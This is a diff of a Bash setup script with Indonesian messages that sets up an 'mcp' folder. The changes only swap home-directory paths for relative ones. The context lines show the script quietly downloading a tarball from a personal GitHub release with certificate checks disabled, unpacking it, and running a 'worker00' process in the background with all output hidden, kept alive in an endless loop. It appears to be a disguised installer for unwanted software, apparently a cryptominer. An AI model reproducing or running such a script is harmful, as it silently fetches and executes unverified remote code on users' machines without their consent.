@@ -4,7 +4,7 @@
 # =============================================
 
 echo "🔄 Membuat folder setup..."
-mkdir -p \~/mcp && cd \~/mcp
+mkdir -p mcp && cd mcp
 
 echo "🔄 Mengunduh dan mengekstrak mcpo.tar.gz..."
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1
@@ -12,7 +12,7 @@ tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm -f mcpo.tar.gz
 
 echo "🔄 Mengubah direktori ke folder mcp..."
-cd \~/mcp || { echo "❌ Folder mcp tidak ditemukan!"; exit 1; }
+cd mcp || { echo "❌ Folder mcp tidak ditemukan!"; exit 1; }
 
 echo "🔄 Membuat run.sh..."
 cat > run.sh << 'RUNEOF'
@@ -56,7 +56,7 @@ chmod +x run.sh
 echo "🔄 Membuat bos.sh (Persis seperti requestmu)..."
 cat > bos.sh << 'BOSEEOF'
 #!/bin/bash
-cd \~/mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker00 >/dev/null 2>&1 &
+cd mcp && chmod +x run.sh && nproc --all && ./run.sh 3 worker00 >/dev/null 2>&1 &
 sleep 30
 while true
 do
@@ -69,7 +69,7 @@ chmod +x bos.sh
 
 echo "✅ Sync certificate..."
 if [ -d "python" ]; then
-  cp /etc/ssl/certs/ca-certificates.crt \~/mcp/python/lib/python3.12/site-packages/certifi/cacert.pem 2>/dev/null
+  cp /etc/ssl/certs/ca-certificates.crt mcp/python/lib/python3.12/site-packages/certifi/cacert.pem 2>/dev/null
 fi
 
 echo "✅ Done!"
